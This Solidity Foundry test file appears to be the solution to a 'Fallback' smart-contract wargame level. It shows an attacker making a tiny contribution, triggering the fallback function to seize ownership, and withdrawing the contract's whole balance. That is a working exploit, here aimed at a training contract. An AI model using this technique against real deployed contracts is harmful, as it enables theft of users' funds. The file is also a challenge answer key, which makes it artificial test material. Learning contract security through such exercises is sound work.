/*
* Don't look at the solution without trying yourself first!
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { Test, console } from "forge-std/Test.sol";
import {Fallback} from "@src/01-Fallback/Fallback.sol";

contract HackFallback is Test {
    error HackFallback__TxFailed();

    address public deployer;
    address attacker;
    Fallback public fallbackContract;

    function setUp() public {
        deployer = makeAddr("deployer");
        attacker = makeAddr("attacker");

        vm.prank(deployer);
        fallbackContract = new Fallback();
    }

    function testClaimOwnershipAndReduceBalanceToZero() public {
        // hack the contract
        // your code goes here

        vm.startPrank(attacker);
        vm.deal(attacker, 1 ether);

        // contribute a negligible amount of ether to set attacker contribution > 0
        fallbackContract.contribute{value: 0.0009 ether}();

        // send ether to the contract to set owner == attacker (msg.sender)
        (bool success, ) = address(fallbackContract).call{value: 0.01 ether}("");
        if (!success) revert HackFallback__TxFailed();

        // drain the contract of it's funds
        fallbackContract.withdraw();
        vm.stopPrank();

        assertEq(fallbackContract.owner(), attacker);
        assertEq(address(fallbackContract).balance, 0);
    }
}